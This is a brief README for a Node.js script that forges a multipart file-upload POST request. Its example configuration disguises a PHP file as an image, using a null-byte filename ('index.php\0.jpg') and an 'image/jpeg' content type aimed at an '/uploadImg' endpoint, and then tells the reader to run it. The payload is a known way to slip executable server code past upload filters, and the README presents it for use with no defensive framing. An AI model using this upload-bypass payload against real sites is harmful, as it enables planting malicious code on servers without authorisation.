# fake-post

Fake a POST request in Node.js

## Usage

Modify the `file` variable

```javascript
var file = {
  name: 'index.php',
  fakeName: 'index.php\0.jpg',
  type: 'image/jpeg',
  input: 'file'
};
```

and the `options` variable

```javascript
var options = {
  hostname: 'localhost',
  port: 80,
  path: '/uploadImg',
  method: 'POST',
  headers: {
    'Content-Type': 'multipart/form-data; boundary=' + boundaryKey
  }
};
```
Then run!

```sh
node app.js
```
